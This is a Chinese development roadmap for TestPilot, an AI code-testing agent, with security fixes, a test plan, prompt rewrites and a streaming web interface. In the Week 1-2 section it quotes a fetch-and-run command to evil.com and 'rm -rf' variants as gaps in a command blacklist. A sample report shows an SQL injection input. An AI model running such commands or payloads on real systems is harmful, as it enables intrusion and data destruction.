# TestPilot 开发路线图

> 基于 Week 0 代码审查和产品定位讨论，整理的修正版开发路线。

---

## 产品定位（核心共识）

TestPilot 不是"AI 测试代码生成器"，是**一句话代码体检**。

### 用户场景

个人开发者用 Claude Code / Codex 快速开发完新功能后，后台起 TestPilot：

```
testpilot "帮我完整测一下这个可不可靠" -p ./my-project
```

用户不关心测试代码长什么样。用户要的是：**告诉我哪里会出事。**

### 与 Code Agent 的关系

```
Claude Code / Codex  →  帮你写代码（生产）
TestPilot            →  帮你检查代码（质保）

不竞争，互补。AI 写代码越快，没测试的代码越多，TestPilot 的价值越大。
```

### 核心交付物

**测试代码是中间产物，报告才是交付物。**

```
## 可靠性报告

✅ 正常登录流程：通过
✅ 空密码校验：通过
⚠️  并发登录：未覆盖（建议补充）
❌ SQL 注入测试：发现漏洞
   → user_service.py:47 直接拼接了 SQL
   → 复现：输入 ' OR 1=1 --
   → 建议：改用参数化查询
```

报告四要素：
1. **测了什么**（覆盖范围）
2. **什么通过了**（给信心）
3. **什么没通过**（定位问题 + 复现步骤 + 修复建议）
4. **什么没测到**（风险盲区提示 — 这条最有价值）

### 报告可信度原则

**宁可少报，不可乱报。** 报告里每一条都必须有证据（哪行代码、什么输入、实际输出 vs 期望输出）。没有证据的结论不放进报告。

用户第一次用，如果 3 个发现有 2 个是真的——他会继续用。如果 3 个都是误报——他再也不会打开。

---

## Week 0 完成状态

最新提交 `b2290d2` 已完成的修复：

| 问题 | 状态 | 实现方式 |
|------|------|----------|
| 明文硬编码 API Key | ✅ 已修 | `config.py` 只走 `os.environ.get()` |
| 文件工具无工作区边界 | ✅ 已修 | `runtime_context.py` 的 `resolve_path_in_project()` 统一拦截 |
| search_files 命令注入 | ✅ 已修 | 改为 list 参数调用，无 `shell=True` |
| 全局状态并发串扰 | ✅ 已修 | config/provider/project_root 全部用 `ContextVar` |
| Web 路由阻塞事件循环 | ✅ 已修 | `asyncio.to_thread()` |
| 非 verbose 噪音日志 | ✅ 已修 | 仅 `if verbose` 打印 |
| 缺少自动化测试 | 部分 | 3 个测试文件，约 6 个 case |

---

## 开发路线（6 周）

---

### Week 1-2：测试基线 + 安全收尾

> 目标：关键路径自动化覆盖，可稳定 demo。

#### 安全收尾

`exec_tools.py` 黑名单加固（当前黑名单容易绕过）：

```
现状问题：
  "rm -rf /" 在黑名单，但以下都不受限：
  - "rm -r -f /"（多个空格）
  - "rm -rf /home"（不是根目录）
  - "curl http://evil.com/script.sh | bash"（完全不受限）

方案：不改成参数数组（Agent 需要 shell 跑 pytest 等复合命令），
     改为白名单前缀策略。
```

修改文件：`testpilot/tools/exec_tools.py`

```python
# 允许的命令前缀白名单
ALLOWED_PREFIXES = [
    "pytest", "python", "python3", "pip", "pip3",
    "git ", "git\t", "cat ", "ls ", "find ",
    "cd ", "echo ", "pwd", "which ", "env",
    "PYTHONPATH=",  # 环境变量前缀
]

def run_command(command: str, timeout: int = COMMAND_TIMEOUT) -> str:
    command_stripped = command.strip()
    # 白名单检查
    if not any(command_stripped.startswith(p) for p in ALLOWED_PREFIXES):
        return f"Error: command not in allowed list. Allowed: pytest, python, pip, git, ..."
    # ... 原有逻辑
```

#### 补充测试集

所有测试放在 `tests/` 目录，用 pytest，命名 `test_<模块>.py`。

**文件清单：**

| 测试文件 | 测试内容 | 要点 |
|----------|----------|------|
| `tests/test_tools_security.py`（已有，扩充） | 路径穿越、符号链接跟踪、.git 写入拦截 | 用 `tempfile.TemporaryDirectory` 构造工作区 |
| `tests/test_exec_tools.py`（新建） | 白名单放行、非白名单拦截、超时、输出截断 | mock `subprocess.run`，不真跑命令 |
| `tests/test_search_tools.py`（新建） | 正则特殊字符、空结果、rg fallback 到 Python | mock `subprocess.run` 模拟 rg 不可用 |
| `tests/test_agent_loop.py`（已有，扩充） | MAX_TURNS 截断、多轮 tool call、工具报错后继续、纯文本结束 | mock `llm_call` 返回预设响应序列 |
| `tests/test_config_security.py`（已有，扩充） | API Key 只走环境变量、未设 Key 时 validate 报错 | `patch.dict(os.environ)` |
| `tests/test_web_api.py`（新建） | 并发请求隔离、配置错误 400、路径不存在 400 | 用 `fastapi.testclient.TestClient`，并发用 `concurrent.futures.ThreadPoolExecutor` |

**CI 配置**（GitHub Actions）：

```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -e ".[all]" && pip install pytest
      - run: python -m compileall testpilot
      - run: pytest tests/ -v
```

#### 验收标准（M1）

- [ ] 白名单策略通过测试，非白名单命令被拦截
- [ ] CI 绿，所有测试通过
- [ ] `testpilot run "测试计算器" -p ./test-project --preset litellm-opus` 能跑通完整流程

---

### Week 3：Prompt 工程 + 报告模板

> 目标：Agent 行为规范化，报告格式标准化。

**不做状态机。** 当前 ReAct loop + prompt 约束够用。如果后续发现 Agent 反复跑偏再考虑加硬约束。

#### 修改文件清单

| 文件 | 改动 |
|------|------|
| `testpilot/prompts/AGENTS.md` | 全部重写 |
| `testpilot/prompts/SOUL.md` | 重写，强化报告定位 |
| `testpilot/skills/testing-python/SKILL.md` | 加入安全约束段落 |

#### AGENTS.md 完整新内容

```markdown
# TestPilot

你是 TestPilot，一个专精于软件测试的 AI Agent。
你的核心任务是对用户的代码进行可靠性体检，输出一份有证据支撑的可靠性报告。

## 核心原则

- **报告质量 > 测试数量。** 5 个有价值的测试好过 20 个水测试。
- **宁可少报，不可乱报。** 每个发现必须有证据（代码位置、输入、实际输出 vs 期望输出）。没有证据的结论不放进报告。
- **测试代码是中间产物，报告才是交付物。** 用户要的是"哪里会出事"，不是测试代码。

## 你的工具

你有 5 个工具: list_dir, read_file, write_file, search_files, run_command。

## 工作流程（严格按顺序执行）

### Phase 1: Explore（最多 3 次工具调用）

目标：了解项目全貌和技术栈。

1. `list_dir(".")` 查看项目顶层结构
2. 检查 `.testpilot/features/` 是否有已缓存的功能文档
   - 有匹配文档 → 读取后直接跳到 Phase 2
   - 没有 → `search_files` 搜索用户描述的功能关键词
3. 读取配置文件（pyproject.toml / package.json / pom.xml 等）确定技术栈

完成标志：你已知道项目用什么语言、什么框架、测试怎么跑、目标代码在哪些文件里。

### Phase 2: Read（最多 5 次工具调用）

目标：深入理解被测代码的逻辑。

1. 逐个 `read_file` 目标源码文件
2. 检查已有测试数据：tests/fixtures/, tests/data/, conftest.py
3. 如果是首次测该功能，将理解结果写入 `.testpilot/features/<功能名>.md`

完成标志：你能说出核心函数的输入/输出、主要分支、异常路径和外部依赖。

### Phase 3: Generate + Execute（最多 15 次工具调用）

目标：生成测试、执行、修正，构建证据。

1. 一次生成 5-8 个测试函数，覆盖：正向 / 反向 / 边界 / 异常
2. `write_file` 写入测试文件
3. `run_command` 执行测试（带 --tb=short）
4. 分析结果：
   - 语法/导入错误 → 修复测试代码，重新执行（最多重试 3 次）
   - 断言失败 → 判断是测试代码写错还是发现了源码 bug
     - 测试写错 → 修复重试
     - 源码 bug → 记录证据（源码位置、输入、实际输出、期望输出）
5. 每个测试执行完，立即把结果记到你的心理笔记中，为最终报告积累素材

### Phase 4: Report（最后一步，不再调用任何工具）

目标：输出完整的可靠性报告。

你必须严格按照以下模板输出报告：

---

# 可靠性报告: <功能名>

## 概览
- 项目: <路径>
- 技术栈: <语言 + 框架>
- 测试范围: <测了哪些模块/函数>
- 测试数量: N 个
- 通过: N | 失败: N

## 通过项

### ✅ test_xxx — <一句话描述>
验证了: <这个测试证明了什么能力是可靠的>

（每个通过的测试都列出）

## 发现的问题

### ❌ test_yyy — <一句话描述>
- **源码位置**: `file.py:line`
- **实际行为**: 当输入 X 时，返回了 Y
- **期望行为**: 应当返回 Z / 应当抛出异常
- **复现命令**: `pytest tests/test_xxx.py::test_yyy -v`
- **修复建议**: <具体建议>

（每个失败的测试都列出，且必须包含以上全部 5 个字段）

## 未覆盖的风险

- ⚠️ <描述一个你没测到但可能出问题的场景及原因>
- ⚠️ <描述另一个>

（至少列出 2 个未覆盖的风险点。这个板块是你最重要的输出之一。）

## 覆盖率

（如果执行了 --cov，列出覆盖率数据；否则写"未检测"）

---

## 约束

- 不要修改用户的源码，只创建/修改测试文件和 .testpilot/ 下的文件
- 不要编造测试数据，优先使用项目已有的 fixture/seed 数据
- 不要生成 assert True 这种无意义断言
- 每个测试函数必须有至少一个有意义的断言
- 测试函数命名: test_<行为>_<条件>_<预期结果>
- Mock 策略: 只 mock 外部 IO（数据库/网络/文件系统），不 mock 被测逻辑本身
```

#### SOUL.md 完整新内容

```markdown
## 角色

你是一个经验丰富的 QA 工程师，专门帮个人开发者做代码体检。

你的工作风格:
- 直接、简洁，不说废话
- 先理解再动手，不急于生成代码
- 关注报告质量而非测试数量
- 发现源码问题时给出具体位置、复现步骤和修复建议
- 报告中没有把握的东西不写——宁可少报不可乱报
- 全程自主完成，不反复向用户确认
- 一定要指出你没测到的风险盲区——你知道自己不知道什么，这比你知道什么更有价值
```

#### SKILL.md 新增段落

在现有 `testing-python/SKILL.md` 末尾追加：

```markdown
## 测试安全约束（必须遵守）

- 所有涉及网络请求的调用必须 mock，不得发起真实 HTTP 请求
- 所有涉及数据库的操作必须 mock，不得连接真实数据库
- 所有涉及文件系统写入的操作必须使用 tmp_path fixture 或 mock
- 不得调用任何外部 API（支付、邮件、短信等）
- 不得执行会修改项目源码的操作
- 如果无法确定某个依赖是否有副作用，默认 mock

## 报告中的证据标准

每个"发现的问题"必须包含:
1. 源码位置（文件名:行号）
2. 实际行为（具体输入 → 具体输出）
3. 期望行为
4. 复现命令（可直接粘贴执行）
5. 修复建议

缺少任何一项的发现不应写入报告。
```

#### 验收方法

用 `test-project/`（已有的 calculator 项目）跑一次完整流程：

```bash
testpilot run "测试计算器功能" -p ./test-project --preset litellm-opus -v
```

检查清单：
- [ ] Agent 按 Phase 1 → 2 → 3 → 4 顺序执行
- [ ] 报告格式符合模板（概览、通过项、发现的问题、未覆盖的风险、覆盖率）
- [ ] "发现的问题"每条有完整 5 字段证据
- [ ] "未覆盖的风险"至少 2 条
- [ ] 测试代码中 mock 了所有外部依赖（calculator 无外部依赖，此项跳过）
- [ ] 能正确检测出 `divide` 方法未处理除零异常

---

### Week 4：Web GUI + AskUser 门禁

> 目标：提供可用的 Web 界面，Agent 遇到模糊需求时主动询问。

#### Web GUI 架构

现状：`web.py` 内联了一整页 HTML 字符串，所有交互是"提交 → 等待 → 一次性返回结果"，没有实时进度。

目标状态：

```
用户在 Web 界面输入 → 提交 → 看到实时进度流 → 收到最终报告
                                ↓
                      [explore] 扫描项目结构...
                      [read] 阅读 auth/service.py...
                      [generate] 生成 6 个测试...
                      [execute] pytest tests/test_login.py
                      ...
                      ──────────────
                      📊 可靠性报告（格式化渲染）
```

**技术方案：SSE（Server-Sent Events）实时推流**

选 SSE 而不是 WebSocket，因为：
- 单向流够用（服务端 → 客户端）
- 不需要额外依赖，FastAPI 原生支持
- 浏览器原生 `EventSource` API，前端实现简单

**修改文件清单：**

| 文件 | 改动 |
|------|------|
| `testpilot/agent.py` | 加入回调机制，每次工具调用时通知外部 |
| `testpilot/web.py` | 重写：SSE 端点 + 前端重构 |
| `testpilot/templates/index.html`（新建） | 前端单页，从 web.py 的内联 HTML 独立出来 |

**agent.py 改动：加入进度回调**

```python
# 在 run_agent 函数签名中增加可选回调
def run_agent(
    user_request: str,
    project_path: str,
    verbose: bool = False,
    llm_config: LLMConfig | None = None,
    on_progress: Callable[[str, str], None] | None = None,
    #              参数: (事件类型, 内容)
    #              事件类型: "tool_call" | "tool_result" | "text" | "report"
) -> AgentResult:
    ...
    # 在工具调用处：
    if on_progress:
        on_progress("tool_call", f"[{tc.name}] {_summarize_input(tc.input)}")
    result = execute_tool(tc.name, tc.input)
    if on_progress:
        on_progress("tool_result", result[:200])
```

**web.py 核心改动：SSE 端点**

```python
from fastapi.responses import StreamingResponse
import json, asyncio, queue

@app.post("/api/test/stream")
async def run_test_stream(req: TestRequest):
    """SSE 流式返回测试进度和结果"""
    # ... 配置构建同原有 /api/test ...

    progress_queue = queue.Queue()

    def on_progress(event_type: str, content: str):
        progress_queue.put({"event": event_type, "data": content})

    async def event_generator():
        # 在线程中运行 agent（不阻塞事件循环）
        loop = asyncio.get_event_loop()
        agent_future = loop.run_in_executor(
            None, run_agent, req.request, str(project_path),
            False, llm_config, on_progress
        )

        # 持续读取进度队列，推送 SSE
        while not agent_future.done():
            try:
                msg = progress_queue.get(timeout=0.5)
                yield f"event: {msg['event']}\ndata: {json.dumps(msg['data'])}\n\n"
            except queue.Empty:
                yield f"event: ping\ndata: \"\"\n\n"  # 保活

        # Agent 完成，发送最终结果
        result = await asyncio.wrap_future(agent_future)
        yield f"event: report\ndata: {json.dumps(result.output)}\n\n"
        yield f"event: stats\ndata: {json.dumps({...})}\n\n"
        yield f"event: done\ndata: \"\"\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")
```

**前端核心改动：EventSource 监听**

```javascript
// 从 fetch + await 改为 EventSource 流式接收
const evtSource = new EventSource(`/api/test/stream?${params}`);
// 注意：EventSource 只支持 GET，如需 POST，改用 fetch + ReadableStream

// 或用 fetch 读流：
const response = await fetch('/api/test/stream', { method: 'POST', body: ... });
const reader = response.body.getReader();
const decoder = new TextDecoder();
while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    const text = decoder.decode(value);
    // 解析 SSE 格式，更新 UI
    appendToProgress(text);
}
```

**前端页面改造要点：**

- 从 `web.py` 的 `HTML_TEMPLATE` 字符串迁移到独立文件 `testpilot/templates/index.html`
- 进度区域：实时显示 `[tool_name] 参数摘要` 的滚动日志
- 报告区域：最终报告用 markdown 渲染（引入轻量 markdown 渲染库如 marked.js，CDN 引入即可）
- 保留现有的模型选择、项目路径等配置表单

#### AskUser 门禁

**架构决策：新增 `ask_user` 工具**

不靠 LLM 输出特殊标记（不可靠），而是把"提问"作为一个正式工具注册：

```python
# testpilot/tools/ask_tools.py（新建）

register_tool(
    name="ask_user",
    description="当你缺少关键信息无法继续时，向用户提问。"
                "只在必要时使用，不要反复确认。",
    input_schema={
        "type": "object",
        "properties": {
            "questions": {
                "type": "array",
                "items": {"type": "string"},
                "description": "要问用户的问题列表（1-3 个）",
                "maxItems": 3
            },
            "suggestion": {
                "type": "string",
                "description": "你的推荐选项（如果有的话）"
            }
        },
        "required": ["questions"]
    },
    handler=ask_user_handler
)
```

**CLI 模式实现：**

`ask_user_handler` 在 CLI 模式下直接用 `click.prompt()` 阻塞等待用户输入：

```python
def ask_user_handler(questions: list[str], suggestion: str = "") -> str:
    """CLI 模式：直接在终端提问"""
    print("\n🤔 TestPilot 需要你的确认：")
    answers = []
    for i, q in enumerate(questions, 1):
        if suggestion and i == 1:
            answer = click.prompt(f"  {i}. {q}", default=suggestion)
        else:
            answer = click.prompt(f"  {i}. {q}")
        answers.append(f"Q: {q}\nA: {answer}")
    return "\n".join(answers)
```

**Web 模式实现：**

Web 模式下，`ask_user` 工具不能阻塞（事件循环），改为通过 SSE 推问题、等待 HTTP 回答：

```python
# web 模式下的 ask_user 流程：
# 1. Agent 调用 ask_user 工具
# 2. handler 向 SSE 流推送 event: ask_user，携带问题
# 3. handler 阻塞在一个 threading.Event 上等待回答
# 4. 前端收到问题，展示 UI，用户填写后 POST /api/test/{task_id}/answer
# 5. answer 端点设置 Event，handler 拿到答案返回给 Agent
# 6. Agent 继续执行
```

```python
# web.py 新增端点
@app.post("/api/test/{task_id}/answer")
async def submit_answer(task_id: str, body: AnswerRequest):
    """用户回答 AskUser 的问题"""
    # 将答案写入对应任务的 Event/Queue
    ...
```

**Prompt 中的范围判断指令：**

在 AGENTS.md 的 Phase 1 后追加：

```markdown
### Phase 1.5: 范围确认（仅在范围模糊时）

如果用户的请求模糊（如"帮我测一下这个项目"），在 Explore 结束后：
1. 统计发现了多少个模块/功能入口
2. 如果 > 3 个模块，调用 ask_user 询问：
   - "检测到 N 个模块: [列表]。你想全部测试还是指定某几个？"
   - suggestion 给出你认为最关键的 2-3 个模块
3. 如果用户指定了具体功能（如"测试登录"），不要询问，直接开始。

只在真正缺少信息时询问。能推断出来的不要问。
```

#### 修改文件汇总

| 文件 | 改动类型 | 说明 |
|------|----------|------|
| `testpilot/agent.py` | 修改 | 加 `on_progress` 回调参数 |
| `testpilot/web.py` | 重写 | SSE 流式端点 + AskUser answer 端点 |
| `testpilot/templates/index.html` | 新建 | 独立前端页面，支持进度流 + 报告渲染 + AskUser UI |
| `testpilot/tools/ask_tools.py` | 新建 | ask_user 工具实现 |
| `testpilot/tools/__init__.py` | 修改 | 导入 ask_tools |
| `testpilot/prompts/AGENTS.md` | 修改 | 加入 Phase 1.5 范围确认指令 |
| `testpilot/cli.py` | 修改 | run_cmd 传入 on_progress（verbose 模式打印进度） |

#### 验收标准（M2）

- [ ] Web：提交后看到实时进度流（不是等 N 分钟一次性返回）
- [ ] Web：最终报告用 markdown 格式化渲染
- [ ] CLI：模糊请求触发 ask_user，终端暂停等待输入，回答后继续
- [ ] Web：模糊请求触发 ask_user，前端弹出问题表单，提交后继续
- [ ] 明确请求（如"测试登录"）不触发询问，直接执行

---

### Week 5-6：报告质量打磨 + 端到端验收

> 目标：个人开发者闭环体验达标，可对外试用。

#### 失败分类（Prompt 细化）

在 AGENTS.md 的 Phase 3 中细化判断标准：

```markdown
#### 失败分类标准

测试失败后，按以下顺序判断：

1. **导入错误 / 语法错误** → 这是你的测试代码写错了
   修复方式：检查 import 路径、拼写、缩进
   处理：修复后重试

2. **fixture / mock 配置错误** → 这是你的测试代码写错了
   修复方式：检查 mock 路径、fixture 作用域
   处理：修复后重试

3. **断言失败且实际输出是"合理"的** → 你的断言写错了
   例：你断言返回 200，实际返回 201（创建成功），这是你理解错了
   处理：修正断言

4. **断言失败且实际输出是"不合理"的** → 这是源码 bug
   例：除以零没有抛异常而是返回了 None
   处理：记入报告，附完整证据

判断"合理 vs 不合理"的标准：
- 阅读源码注释和函数签名推断开发者意图
- 参考项目已有测试的断言模式
- 如果不确定，标记为"疑似问题"并说明你的判断依据
```

#### 验收用的测试项目

准备 3 个复杂度递增的项目：

| 项目 | 复杂度 | 预期发现 |
|------|--------|----------|
| `test-project/`（已有） | 低：calculator，2 个方法 | divide 未处理除零 |
| `test-project-api/`（新建） | 中：FastAPI CRUD，含数据库交互 | 需要正确 mock SQLAlchemy，测 404/422 边界 |
| `test-project-real/`（找一个真实开源小项目） | 高：真实项目，多文件多依赖 | 报告是否有实际价值 |

每个项目的验收标准：

```
1. 完整跑通（不崩溃、不死循环、不超 MAX_TURNS）
2. 报告格式符合模板
3. 发现的问题有完整证据（5 字段全有）
4. 未覆盖的风险至少 2 条且合理
5. 误报率 < 30%（人工核实）
6. 耗时 < 5 分钟
7. Token 消耗记录（作为成本基线）
```

#### 变更感知（如果时间允许）

```python
# 在 agent.py 中，如果项目是 git 仓库，自动获取最近改动
import subprocess

def get_recent_changes(project_path: str) -> str | None:
    try:
        result = subprocess.run(
            ["git", "diff", "--name-only", "HEAD~1"],
            capture_output=True, text=True, timeout=10,
            cwd=project_path
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return None

# 如果有改动文件，在 user message 中追加：
# "最近修改的文件: auth/service.py, auth/router.py\n请优先测试这些文件。"
```

#### 性能优化检查清单

- [ ] Feature Doc 缓存：二次运行同一功能确实跳过探索阶段（对比 token 消耗）
- [ ] 精准读码：Agent 不读无关文件（检查 verbose 日志中的 read_file 列表）
- [ ] 基线记录：每个测试项目记录 `耗时 / 轮次 / input_tokens / output_tokens`

#### 验收标准（M3）

- [ ] 3 个测试项目全部跑通，报告符合质量标准
- [ ] CLI 体验：一句话输入 → 5 分钟内出报告
- [ ] Web 体验：实时进度 → 格式化报告 → 可交互
- [ ] 误报率 < 30%（人工核实 3 个项目的所有发现）
- [ ] 二次运行明显更快（Feature Doc 缓存生效）

---

## 里程碑总览

```
M1（Week 2 末）
  安全和测试基线清零，CI 绿，可稳定 demo。

M2（Week 4 末）
  Web GUI 实时进度 + 报告渲染。
  AskUser 门禁可用，模糊请求主动询问。
  Prompt 驱动的规范流程，报告格式标准化。

M3（Week 6 末）
  3 个项目验收通过，误报率 < 30%。
  个人开发者闭环体验达标，可对外试用。
```

---

## 各周修改文件速查

```
Week 1-2（测试基线）
  修改: testpilot/tools/exec_tools.py        ← 白名单加固
  新建: tests/test_exec_tools.py             ← exec 工具测试
  新建: tests/test_search_tools.py           ← search 工具测试
  新建: tests/test_web_api.py                ← Web API 测试
  扩充: tests/test_tools_security.py         ← 更多安全边界
  扩充: tests/test_agent_loop.py             ← 更多 agent 场景
  扩充: tests/test_config_security.py        ← 更多配置场景
  新建: .github/workflows/ci.yml             ← CI 配置

Week 3（Prompt 工程）
  重写: testpilot/prompts/AGENTS.md          ← 阶段标记 + 报告模板
  重写: testpilot/prompts/SOUL.md            ← 强化报告定位
  修改: testpilot/skills/testing-python/SKILL.md ← 安全约束 + 证据标准

Week 4（Web GUI + AskUser）
  修改: testpilot/agent.py                   ← on_progress 回调
  重写: testpilot/web.py                     ← SSE 流式 + answer 端点
  新建: testpilot/templates/index.html       ← 独立前端页面
  新建: testpilot/tools/ask_tools.py         ← ask_user 工具
  修改: testpilot/tools/__init__.py          ← 导入 ask_tools
  修改: testpilot/cli.py                     ← on_progress 传入
  修改: testpilot/prompts/AGENTS.md          ← Phase 1.5 范围确认

Week 5-6（报告打磨）
  修改: testpilot/prompts/AGENTS.md          ← 失败分类标准
  修改: testpilot/agent.py                   ← 变更感知（可选）
  新建: test-project-api/                    ← 中等复杂度验收项目
```

---

## 不做的事（范围控制）

- 不做企业级权限系统
- 不做重型 UI 框架（React/Vue）—— 纯 HTML + 原生 JS + CDN 依赖够用
- 不做多语言全覆盖，先把 Python + pytest 做稳
- 不做硬状态机，prompt 约束够用就不加代码复杂度
- 不做 Docker 沙箱（MVP 用 prompt 强制 mock 替代）
- 不做 WebSocket（SSE 单向流够用）

---

## 提前考虑但不立即实现

### 测试执行安全

Agent 在用户项目里跑自己生成的代码，比读写文件危险：
- 可能调用真实外部 API（发邮件、扣费）
- 可能往数据库写脏数据
- 可能修改项目文件状态

**MVP 策略**：在 Skill 中强制 mock 所有外部依赖（Week 3 实现）。
**后续策略**：提供 `--sandbox` 模式（docker / 临时目录）。

### 成本控制

用户自选 API 和模型（已支持：预设 + 自定义 + 环境变量三条路）。

优化方向：
- Feature Doc 缓存减少重复探索
- 精准读码减少 token 消耗
- 阶段预算限制防止 token 浪费

---

## 技术决策记录

| 决策 | 选择 | 原因 |
|------|------|------|
| 状态机 vs Prompt 约束 | Prompt 约束 | 零额外代码，改起来秒级，Claude Code 自己也是这个模式 |
| 报告 vs 测试代码 | 报告为主 | 用户要的是"哪里会出事"，不是测试代码 |
| 测试安全 | Prompt 强制 mock | MVP 最务实，后续加 sandbox |
| 多模型支持 | 用户自选 | 用户自带 API Key，成本自控 |
| Agent 控制粒度 | 阶段预算提示 | 轻量，够用再加硬约束 |
| 实时进度方案 | SSE | 单向流够用，无额外依赖，比 WebSocket 简单 |
| AskUser 实现 | 注册为工具 | 比特殊标记可靠，Agent 主动调用，不依赖输出解析 |
| 前端方案 | 原生 HTML + JS + CDN | 不引入构建工具，MVP 够用 |
